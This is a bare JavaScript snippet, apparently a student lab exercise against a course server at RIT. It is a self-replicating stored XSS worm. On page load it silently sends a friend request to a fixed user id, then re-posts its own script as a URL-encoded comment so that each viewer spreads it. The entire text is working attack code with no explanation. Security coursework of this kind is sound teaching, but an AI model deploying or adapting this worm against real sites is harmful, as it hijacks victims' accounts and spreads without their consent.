<script id="bigbigbad">
const AddH = new XMLHttpRequest(); 
const url = "http://csec380-core.csec.rit.edu:86/add_friend.php?id=172"; 
AddH.open("POST", url); 
AddH.send(); 
var hTag = "<script id=\"bigbigbad\">"; 
var jsCode = document.getElementById("bigbigbad").innerHTML; 
var tTag1 = "</"; var tTag2 = "script>"; 
var tTag = tTag1.concat(tTag2); 
var worm1 = jsCode.concat(tTag); 
var worm = hTag.concat(worm1); 
var wormCode = encodeURIComponent(worm); 
const spreadH = new XMLHttpRequest(); 
var url1 = "http://csec380-core.csec.rit.edu:86/add_comment.php?comment="; 
const spreadU = url1.concat(wormCode); 
spreadH.open("POST", spreadU); 
spreadH.send(); 
</script>
